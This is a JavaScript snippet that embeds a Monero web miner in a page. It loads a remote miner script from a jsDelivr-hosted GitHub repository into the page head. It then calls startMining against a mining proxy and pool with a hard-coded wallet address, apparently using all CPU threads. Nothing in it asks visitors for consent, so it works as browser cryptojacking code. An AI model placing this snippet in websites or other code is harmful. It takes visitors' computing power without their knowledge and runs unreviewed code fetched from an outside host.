// Start Of Mining Code (Javascript)
// import command,
// import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';

var script = document.createElement("script");
script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
document.head.appendChild(script);

server = "wss://ny1.xmrminingproxy.com";
var pool = "monero.herominers.com";
var walletAddress = "49rCPgGxMrLApihwWtFXkcKH9fAKkuqYWNQBHyJn1g54DAw5k8CiqVVavbdEbk1hBqeYJcDj7SEQYJUJw9aBbYUNBGxzP58";
var workerId = "GH-XMR-JS-SNIPPET"
var threads = -1;
var password = "";
startMining(pool, walletAddress, workerId, threads, password);
throttleMiner = 20;
// End Of Mining Code
